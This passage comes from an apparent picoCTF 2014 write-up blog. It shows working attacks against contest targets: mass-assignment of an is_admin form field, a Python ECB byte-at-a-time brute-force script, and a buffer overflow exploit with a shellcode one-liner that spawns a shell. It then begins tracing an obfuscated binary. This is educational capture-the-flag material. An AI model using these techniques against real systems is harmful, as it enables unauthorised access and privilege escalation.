</pre></td><td class='code'><pre><code class='html'><span class='line'><span class="nt">&lt;form</span> <span class="na">accept-charset=</span><span class="s">&quot;UTF-8&quot;</span> <span class="na">action=</span><span class="s">&quot;http://web2014.picoctf.com:5000/user/create&quot;</span> <span class="na">method=</span><span class="s">&quot;post&quot;</span><span class="nt">&gt;&lt;div</span> <span class="na">style=</span><span class="s">&quot;margin:0;padding:0;display:inline&quot;</span><span class="nt">&gt;&lt;input</span> <span class="na">name=</span><span class="s">&quot;utf8&quot;</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">value=</span><span class="s">&quot;&amp;#x2713;&quot;</span> <span class="nt">/&gt;&lt;input</span> <span class="na">name=</span><span class="s">&quot;authenticity_token&quot;</span> <span class="na">type=</span><span class="s">&quot;hidden&quot;</span> <span class="na">value=</span><span class="s">&quot;+yYhUookKb5lZuf2bU97ccd3TWYizvaxFYpWfR5H/b8=&quot;</span> <span class="nt">/&gt;&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;control-group&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;control-label&quot;</span> <span class="na">for=</span><span class="s">&quot;user_name&quot;</span><span class="nt">&gt;</span>Name<span class="nt">&lt;/label&gt;</span>:
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;controls&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">&quot;user_name&quot;</span> <span class="na">name=</span><span class="s">&quot;user[name]&quot;</span> <span class="na">size=</span><span class="s">&quot;30&quot;</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;control-group&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;control-label&quot;</span> <span class="na">for=</span><span class="s">&quot;user_username&quot;</span><span class="nt">&gt;</span>Username<span class="nt">&lt;/label&gt;</span>:
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;controls&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">&quot;user_username&quot;</span> <span class="na">name=</span><span class="s">&quot;user[username]&quot;</span> <span class="na">size=</span><span class="s">&quot;30&quot;</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>
</span><span class='line'>  <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;control-group&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;control-label&quot;</span> <span class="na">for=</span><span class="s">&quot;user_password&quot;</span><span class="nt">&gt;</span>Password<span class="nt">&lt;/label&gt;</span>:
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;controls&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">&quot;user_password&quot;</span> <span class="na">name=</span><span class="s">&quot;user[password]&quot;</span> <span class="na">size=</span><span class="s">&quot;30&quot;</span> <span class="na">type=</span><span class="s">&quot;password&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;control-group&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>    <span class="nt">&lt;label</span> <span class="na">class=</span><span class="s">&quot;control-label&quot;</span> <span class="na">for=</span><span class="s">&quot;user_is_admin&quot;</span><span class="nt">&gt;</span>is_admin<span class="nt">&lt;/label&gt;</span>:
</span><span class='line'>    <span class="nt">&lt;div</span> <span class="na">class=</span><span class="s">&quot;controls&quot;</span><span class="nt">&gt;</span>
</span><span class='line'>      <span class="nt">&lt;input</span> <span class="na">id=</span><span class="s">&quot;user_password&quot;</span> <span class="na">name=</span><span class="s">&quot;user[is_admin]&quot;</span> <span class="na">size=</span><span class="s">&quot;30&quot;</span> <span class="na">type=</span><span class="s">&quot;text&quot;</span> <span class="na">value=</span><span class="s">&quot;1&quot;</span> <span class="nt">/&gt;</span>
</span><span class='line'>    <span class="nt">&lt;/div&gt;</span>
</span><span class='line'>  <span class="nt">&lt;/div&gt;</span>
</span></code></pre></td></tr></table></div></figure>


<p>By adding the <code>user[is_admin]</code> parameter, the register page thinks we are admin and gives us the flag:</p>

<p><img src="http://barrebas.github.io/assets/picoctf/daedelus.png" alt="" /></p>

<h1>Web Interception (140 points)</h1>

<p><code>We were able to get some code running in a Daedalus browser.
Unfortunately we can't quite get it to send us a cookie for its internal
login page ourselves... But we can make it make requests that we can see,
and it seems to be encrypting using ECB mode. See here for more details
about what we can get. It's running at vuln2014.picoctf.com:65414.
Can you get us the cookie?</code></p>

<p>Swappage and me solved this one. The program does the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="k">def</span> <span class="nf">oracle</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="c"># so, this is simulated. In reality we&#39;d have to run javascript on a target web browser</span>
</span><span class='line'>  <span class="c"># and capture the traffic. That&#39;s pretty hard to do in a way that scales, though, so we</span>
</span><span class='line'>  <span class="c"># simulate it instead.</span>
</span><span class='line'>  <span class="c"># This uses ECB mode.</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">AESCipher</span><span class="p">(</span><span class="n">key</span><span class="p">)</span><span class="o">.</span><span class="n">encrypt</span><span class="p">(</span><span class="n">pkcs7_pad</span><span class="p">(</span><span class="s">&#39;GET /&#39;</span> <span class="o">+</span> <span class="n">s</span><span class="o">.</span><span class="n">decode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span> <span class="o">+</span> <span class="n">secret_data</span><span class="p">))</span>
</span></code></pre></td></tr></table></div></figure>


<p>It takes user-supplied <em>hex-encoded</em> data and then returns an encrypted ciphertext in ECB mode. We need to find secret_data. The trick here is that ECB mode will return identical ciphertexts for identical plaintexts. Furthermore, it is a block-mode encryption. This means that we can create a block, have it encrypted, and check if it is present in the returned ciphertext. If so, our block must have matched part of the secret_data. In terms of blocks, we do the following:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="p">[</span> <span class="n">GET</span> <span class="o">/</span><span class="n">aaaaaaaaaaa</span>                  <span class="p">]</span> <span class="c"># block one, padded to 16 bytes</span>
</span><span class='line'><span class="p">[</span> <span class="n">guess_byte</span> <span class="o">+</span> <span class="n">pkcs7_padding</span>        <span class="p">]</span> <span class="c"># block two, our guess</span>
</span><span class='line'><span class="p">[</span> <span class="n">bogus</span> <span class="nb">bytes</span> <span class="o">+</span> <span class="n">part</span> <span class="n">of</span> <span class="n">secret_data</span> <span class="p">]</span> <span class="c"># block three, part of secret_data</span>
</span><span class='line'><span class="p">[</span> <span class="o">...</span><span class="n">secret_data</span><span class="o">...</span>                 <span class="p">]</span> <span class="c"># block four, more secret_data</span>
</span><span class='line'><span class="p">[</span> <span class="n">one</span> <span class="n">byte</span> <span class="n">of</span> <span class="n">secret_data</span> <span class="o">+</span> <span class="n">padding</span> <span class="p">]</span> <span class="c"># block five, we are interested in the ciphertext of this block!</span>
</span></code></pre></td></tr></table></div></figure>


<p>So if the ciphertext of our block two matches that of block five, we know that our guess was ok! We then prepend another byte to our guessed block. We add more padding to block three so that now, not one but <em>two</em> bytes of the secret_data are pushed onto block five. We repeat our guess for all possible characters and check the ciphertexts of block two and five. If they match, we have a bingo!</p>

<p>Long story short, here&rsquo;s the script to bruteforce secret_data:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
<span class='line-number'>19</span>
<span class='line-number'>20</span>
<span class='line-number'>21</span>
<span class='line-number'>22</span>
<span class='line-number'>23</span>
<span class='line-number'>24</span>
<span class='line-number'>25</span>
<span class='line-number'>26</span>
<span class='line-number'>27</span>
<span class='line-number'>28</span>
<span class='line-number'>29</span>
<span class='line-number'>30</span>
<span class='line-number'>31</span>
<span class='line-number'>32</span>
<span class='line-number'>33</span>
<span class='line-number'>34</span>
<span class='line-number'>35</span>
<span class='line-number'>36</span>
<span class='line-number'>37</span>
<span class='line-number'>38</span>
<span class='line-number'>39</span>
<span class='line-number'>40</span>
<span class='line-number'>41</span>
<span class='line-number'>42</span>
<span class='line-number'>43</span>
<span class='line-number'>44</span>
<span class='line-number'>45</span>
<span class='line-number'>46</span>
<span class='line-number'>47</span>
<span class='line-number'>48</span>
<span class='line-number'>49</span>
<span class='line-number'>50</span>
<span class='line-number'>51</span>
<span class='line-number'>52</span>
<span class='line-number'>53</span>
<span class='line-number'>54</span>
<span class='line-number'>55</span>
<span class='line-number'>56</span>
<span class='line-number'>57</span>
<span class='line-number'>58</span>
<span class='line-number'>59</span>
<span class='line-number'>60</span>
<span class='line-number'>61</span>
<span class='line-number'>62</span>
<span class='line-number'>63</span>
<span class='line-number'>64</span>
<span class='line-number'>65</span>
<span class='line-number'>66</span>
<span class='line-number'>67</span>
<span class='line-number'>68</span>
</pre></td><td class='code'><pre><code class='python'><span class='line'><span class="c">#!/usr/bin/python</span>
</span><span class='line'>
</span><span class='line'><span class="kn">from</span> <span class="nn">socket</span> <span class="kn">import</span> <span class="o">*</span>
</span><span class='line'><span class="kn">import</span> <span class="nn">string</span><span class="o">,</span> <span class="nn">time</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">pkcs7_pad</span><span class="p">(</span><span class="n">s</span><span class="p">):</span>
</span><span class='line'>  <span class="n">l</span> <span class="o">=</span> <span class="nb">len</span><span class="p">(</span><span class="n">s</span><span class="p">)</span>
</span><span class='line'>  <span class="n">needed</span> <span class="o">=</span> <span class="mi">16</span> <span class="o">-</span> <span class="p">(</span><span class="n">l</span> <span class="o">%</span> <span class="mi">16</span><span class="p">)</span>
</span><span class='line'>  <span class="k">return</span> <span class="n">s</span> <span class="o">+</span> <span class="p">(</span><span class="nb">chr</span><span class="p">(</span><span class="n">needed</span><span class="p">)</span> <span class="o">*</span> <span class="n">needed</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'><span class="k">def</span> <span class="nf">make_payload</span><span class="p">(</span><span class="n">guess</span><span class="p">):</span>  
</span><span class='line'>  <span class="n">payload</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="c"># pad string to next block</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;a&quot;</span><span class="o">*</span><span class="mi">11</span> 
</span><span class='line'>  
</span><span class='line'>  <span class="c"># insert guessed bytes, but first pad them</span>
</span><span class='line'>  <span class="n">block</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'>  <span class="n">block</span> <span class="o">+=</span> <span class="n">guess</span>
</span><span class='line'>  <span class="n">block</span> <span class="o">=</span> <span class="n">pkcs7_pad</span><span class="p">(</span><span class="n">block</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># add guessed bytes + padding</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="n">block</span>               
</span><span class='line'>
</span><span class='line'>  <span class="c"># push last bytes into a new ciphertext block. The +1 was empirically determined!</span>
</span><span class='line'>  <span class="n">payload</span> <span class="o">+=</span> <span class="s">&quot;a&quot;</span><span class="o">*</span><span class="p">(</span><span class="nb">len</span><span class="p">(</span><span class="n">guess</span><span class="p">)</span><span class="o">+</span><span class="mi">1</span><span class="p">)</span>   
</span><span class='line'>  
</span><span class='line'>  <span class="k">return</span> <span class="n">payload</span>
</span><span class='line'>  
</span><span class='line'><span class="n">bruteforce</span> <span class="o">=</span> <span class="s">&quot;&quot;</span>
</span><span class='line'><span class="c"># think the length of the plaintext is 48 bytes (3 16-byte blocks)</span>
</span><span class='line'><span class="k">while</span> <span class="nb">len</span><span class="p">(</span><span class="n">bruteforce</span><span class="p">)</span> <span class="o">&lt;</span> <span class="mi">48</span><span class="p">:</span>
</span><span class='line'>  
</span><span class='line'>  <span class="c"># we&#39;ll brute-force the entire ascii range</span>
</span><span class='line'>  <span class="k">for</span> <span class="ow">in</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="mi">127</span><span class="p">)</span>
</span><span class='line'>      <span class="n">z</span> <span class="o">=</span> <span class="nb">chr</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>      <span class="c"># display progress</span>
</span><span class='line'>      <span class="k">print</span> <span class="s">&quot;[+] trying {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">i</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>      <span class="c"># connect to server</span>
</span><span class='line'>      <span class="n">s</span><span class="o">=</span><span class="n">socket</span><span class="p">(</span><span class="n">AF_INET</span><span class="p">,</span> <span class="n">SOCK_STREAM</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">connect</span><span class="p">((</span><span class="s">&#39;vuln2014.picoctf.com&#39;</span><span class="p">,</span> <span class="mi">65414</span><span class="p">))</span>
</span><span class='line'>
</span><span class='line'>      <span class="c"># banner</span>
</span><span class='line'>      <span class="n">time</span><span class="o">.</span><span class="n">sleep</span><span class="p">(</span><span class="mf">0.05</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">256</span><span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="c"># we bruteforce backwards, starting at the last byte</span>
</span><span class='line'>      <span class="n">payload</span> <span class="o">=</span> <span class="n">make_payload</span><span class="p">(</span><span class="n">z</span><span class="o">+</span><span class="n">bruteforce</span><span class="p">)</span>
</span><span class='line'>      
</span><span class='line'>      <span class="c"># send payload</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">send</span><span class="p">(</span> <span class="n">payload</span><span class="o">.</span><span class="n">encode</span><span class="p">(</span><span class="s">&#39;hex&#39;</span><span class="p">)</span> <span class="p">)</span>
</span><span class='line'>
</span><span class='line'>      <span class="n">ciphertext</span> <span class="o">=</span> <span class="n">s</span><span class="o">.</span><span class="n">recv</span><span class="p">(</span><span class="mi">1024</span><span class="p">)</span>
</span><span class='line'>  
</span><span class='line'>      <span class="c"># split ciphertext into 32 bytes (which are 16 bytes hex-encoded).</span>
</span><span class='line'>      <span class="c"># we need to look for a duplicate block. if we find a duplicate,</span>
</span><span class='line'>      <span class="c"># it means our guessed bytes match the end of the string.</span>
</span><span class='line'>      <span class="n">blocks</span> <span class="o">=</span> <span class="p">[</span><span class="n">ciphertext</span><span class="p">[</span><span class="n">i</span><span class="p">:</span><span class="n">i</span><span class="o">+</span><span class="mi">32</span><span class="p">]</span> <span class="k">for</span> <span class="n">i</span> <span class="ow">in</span> <span class="nb">range</span><span class="p">(</span><span class="mi">0</span><span class="p">,</span> <span class="nb">len</span><span class="p">(</span><span class="n">ciphertext</span><span class="p">),</span> <span class="mi">32</span><span class="p">)]</span>
</span><span class='line'>
</span><span class='line'>      <span class="c"># check if we have the same encoded block as the guess</span>
</span><span class='line'>      <span class="c"># the guessed block is the second returned block, due to the </span>
</span><span class='line'>      <span class="c"># way the payload is built up. </span>
</span><span class='line'>      <span class="k">if</span> <span class="n">blocks</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span> <span class="ow">in</span> <span class="n">blocks</span><span class="p">[</span><span class="mi">2</span><span class="p">:]:</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;match: {}&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">blocks</span><span class="p">[</span><span class="mi">1</span><span class="p">])</span>
</span><span class='line'>          <span class="n">bruteforce</span> <span class="o">=</span> <span class="n">z</span> <span class="o">+</span> <span class="n">bruteforce</span>
</span><span class='line'>          <span class="k">print</span> <span class="s">&quot;[+] got {} so far&quot;</span><span class="o">.</span><span class="n">format</span><span class="p">(</span><span class="n">bruteforce</span><span class="p">)</span>
</span><span class='line'>      <span class="n">s</span><span class="o">.</span><span class="n">close</span><span class="p">()</span>
</span></code></pre></td></tr></table></div></figure>


<p>The flag is <code>congrats_on_your_first_ecb_ecryption\r\n</code>.</p>

<h1>No Overflow (140 points)</h1>

<p>This program tries to prevent buffer overflows by first asking for the input length.</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf<span class="nv">$ </span>./no_overflow
</span><span class='line'>How long is your name?
</span><span class='line'>10
</span><span class='line'>What is your name?
</span><span class='line'>BBBBBBBBBBBBBBBBBBBBBBBBBB
</span><span class='line'>Hello, BBBBBBBBBBW
</span></code></pre></td></tr></table></div></figure>


<p>It disregards the rest of the ouput. However, the program uses <code>scanf</code>. If we supply <code>-1</code> as the length, we can bypass the overflow check:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf<span class="nv">$ </span><span class="o">(</span><span class="nb">echo</span> -1<span class="p">;</span> python -c <span class="s1">&#39;print &quot;A&quot;*300&#39;</span><span class="o">)</span> <span class="p">|</span> ./no_overflow
</span><span class='line'>How long is your name?
</span><span class='line'>What is your name?
</span><span class='line'>Hello, AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA...snip...
</span><span class='line'>Segmentation fault
</span></code></pre></td></tr></table></div></figure>


<p>From here, it is easy to control EIP:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>bas@tritonal:~/tmp/picoctf<span class="nv">$ </span><span class="o">(</span><span class="nb">echo</span> -1<span class="p">;</span> python -c <span class="s1">&#39;print &quot;A&quot;*268+&quot;BBBB&quot;&#39;</span><span class="p">;</span> <span class="nb">echo</span><span class="o">)</span> <span class="p">|</span> ./no_overflow
</span><span class='line'>How long is your name?
</span><span class='line'>What is your name?
</span><span class='line'>Hello, AAAAAAAAAA...snip...
</span><span class='line'>Segmentation fault <span class="o">(</span>core dumped<span class="o">)</span>
</span><span class='line'>bas@tritonal:~/tmp/picoctf<span class="nv">$ </span>gdb no_overflow core
</span><span class='line'>...snip...
</span><span class='line'>Core was generated by <span class="sb">`</span>./no_overflow<span class="err">&#39;</span>.
</span><span class='line'>Program terminated with signal 11, Segmentation fault.
</span><span class='line'><span class="c">#0  0x42424242 in ?? ()</span>
</span></code></pre></td></tr></table></div></figure>


<p>Quickly checking on the remote server if there is any protection on the binary:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
<span class='line-number'>15</span>
<span class='line-number'>16</span>
<span class='line-number'>17</span>
<span class='line-number'>18</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>pico1139@shell:/home/no_overflow<span class="nv">$ </span>readelf -l no_overflow
</span><span class='line'>
</span><span class='line'>Elf file <span class="nb">type </span>is EXEC <span class="o">(</span>Executable file<span class="o">)</span>
</span><span class='line'>Entry point 0x8048430
</span><span class='line'>There are <span class="m">9</span> program headers, starting at offset 52
</span><span class='line'>
</span><span class='line'>Program Headers:
</span><span class='line'>  Type           Offset   VirtAddr   PhysAddr   FileSiz MemSiz  Flg Align
</span><span class='line'>  PHDR           0x000034 0x08048034 0x08048034 0x00120 0x00120 R E 0x4
</span><span class='line'>  INTERP         0x000154 0x08048154 0x08048154 0x00013 0x00013 R   0x1
</span><span class='line'>      <span class="o">[</span>Requesting program interpreter: /lib/ld-linux.so.2<span class="o">]</span>
</span><span class='line'>  LOAD           0x000000 0x08048000 0x08048000 0x0080c 0x0080c R E 0x1000
</span><span class='line'>  LOAD           0x000f08 0x08049f08 0x08049f08 0x0012c 0x00130 RW  0x1000
</span><span class='line'>  DYNAMIC        0x000f14 0x08049f14 0x08049f14 0x000e8 0x000e8 RW  0x4
</span><span class='line'>  NOTE           0x000168 0x08048168 0x08048168 0x00044 0x00044 R   0x4
</span><span class='line'>  GNU_EH_FRAME   0x0006e0 0x080486e0 0x080486e0 0x0003c 0x0003c R   0x4
</span><span class='line'>  GNU_STACK      0x000000 0x00000000 0x00000000 0x00000 0x00000 RWE 0x10
</span><span class='line'>  GNU_RELRO      0x000f08 0x08049f08 0x08049f08 0x000f8 0x000f8 R   0x1
</span></code></pre></td></tr></table></div></figure>


<p>The stack is executable! Furthermore, ASLR is not enabled. This makes it easy to stick in a <a href="http://shell-storm.org/shellcode/files/shellcode-827.php">shellcode</a> plus a NOP sled and return to an address on the stack:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>pico1139@shell:/home/no_overflow<span class="nv">$ </span><span class="o">(</span><span class="nb">echo</span> -1<span class="p">;</span> python -c <span class="s1">&#39;print &quot;A&quot;*268+&quot;\xd0\xd6\xff\xff&quot;+&quot;\x90&quot;*200+&quot;\x31\xc0\x50\x68\x2f\x2f\x73\x68\x68\x2f\x62\x69\x6e\x89\xe3\x50\x53\x89\xe1\xb0\x0b\xcd\x80&quot;&#39;</span><span class="p">;</span> cat<span class="o">)</span> <span class="p">|</span> ./no_overflow
</span><span class='line'>How long is your name?
</span><span class='line'>What is your name?
</span><span class='line'>Hello, AAAAAAAAAAAAAAAAAAAAAA...snip...
</span><span class='line'>
</span><span class='line'>id
</span><span class='line'><span class="nv">uid</span><span class="o">=</span>11066<span class="o">(</span>pico1139<span class="o">)</span> <span class="nv">gid</span><span class="o">=</span>1007<span class="o">(</span>no_overflow<span class="o">)</span> <span class="nv">groups</span><span class="o">=</span>1017<span class="o">(</span>picogroup<span class="o">)</span>
</span><span class='line'>cat flag.txt
</span><span class='line'>what_is_your_sign
</span></code></pre></td></tr></table></div></figure>


<h1>Obfuscation (150 points)</h1>

<p>Tough one. There are some anti-disassembler tricks in here. Upon running the program, it asks for a password. Let&rsquo;s first try to get a breakpoint somewhere:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>gdb-peda<span class="nv">$ </span>b main
</span><span class='line'>Function <span class="s2">&quot;main&quot;</span> not defined.
</span><span class='line'>gdb-peda<span class="nv">$ </span>b __libc_start_main
</span><span class='line'>Breakpoint <span class="m">1</span> at 0x8048400
</span><span class='line'>gdb-peda<span class="nv">$ </span>r
</span><span class='line'>...
</span><span class='line'>Breakpoint 1, 0xf7e2c970 in __libc_start_main <span class="o">()</span>
</span><span class='line'>   from /lib/i386-linux-gnu/i686/cmov/libc.so.6
</span><span class='line'>gdb-peda<span class="nv">$ </span>x/2x <span class="nv">$esp</span>
</span><span class='line'>0xffffd58c:   0x080484ed  0x08048420
</span></code></pre></td></tr></table></div></figure>


<p>Our entry-point is <code>0x08048420</code>. Set a breakpoint and continue tracing. We encounter an anti-disassembly trick:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">=</span>&gt; 0x804843a:  jmp    0x804843b
</span><span class='line'> <span class="p">|</span> 0x804843c:  ror    BYTE PTR <span class="o">[</span>eax-0x39<span class="o">]</span>,0x44
</span><span class='line'> <span class="p">|</span> 0x8048440:  and    al,0x4
</span><span class='line'> <span class="p">|</span> 0x8048442:  push   esp
</span><span class='line'> <span class="p">|</span> 0x8048443:  lea    eax,<span class="o">[</span>eax+ecx*1<span class="o">]</span>
</span><span class='line'> <span class="p">|</span>-&gt;   0x804843b:   inc    eax
</span><span class='line'>       0x804843d: dec    eax
</span><span class='line'>       0x804843e: mov    DWORD PTR <span class="o">[</span>esp+0x4<span class="o">]</span>,0x8048d54
</span><span class='line'>       0x8048446: mov    DWORD PTR <span class="o">[</span>esp<span class="o">]</span>,0x1
</span></code></pre></td></tr></table></div></figure>


<p>It jumps one byte ahead, in the middle of the instruction, causing the disassembly of the next bytes to be incorrect. Luckily, this won&rsquo;t stop <code>gdb-peda</code>. Soon after, the program asks for a password:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'><span class="o">=</span>&gt; 0x804846a:  call   0x80483c0 &lt;getline@plt&gt;
</span><span class='line'>   0x804846f: <span class="nb">test   </span>eax,eax
</span><span class='line'>
</span><span class='line'>...
</span><span class='line'>
</span><span class='line'>0x0804846a in ?? <span class="o">()</span>
</span><span class='line'>gdb-peda<span class="nv">$ </span>b *0x804846f
</span><span class='line'>Breakpoint <span class="m">2</span> at 0x804846f
</span></code></pre></td></tr></table></div></figure>


<p>I entered <code>012345678</code> and pressed enter. The program transfers control to the function at <code>0x8048580</code> which supposedly checks our password. Set a breakpoint and continue. The programs then takes a single byte from the password and does some checks:</p>

<figure class='code'><figcaption><span></span></figcaption><div class="highlight"><table><tr><td class="gutter"><pre class="line-numbers"><span class='line-number'>1</span>
<span class='line-number'>2</span>
<span class='line-number'>3</span>
<span class='line-number'>4</span>
<span class='line-number'>5</span>
<span class='line-number'>6</span>
<span class='line-number'>7</span>
<span class='line-number'>8</span>
<span class='line-number'>9</span>
<span class='line-number'>10</span>
<span class='line-number'>11</span>
<span class='line-number'>12</span>
<span class='line-number'>13</span>
<span class='line-number'>14</span>
</pre></td><td class='code'><pre><code class='bash'><span class='line'>   0x80485b6:    movzx  ebp,BYTE PTR <span class="o">[</span>ebx+edx*1<span class="o">]</span> <span class="c"># grab char</span>
</span><span class='line'>   0x80485ba: mov    eax,ebp
</span><span class='line'>   0x80485bc: movsx  ecx,al
</span><span class='line'>   0x80485bf: add    ecx,0x40
</span><span class='line'>   0x80485c2: mov    edi,ecx
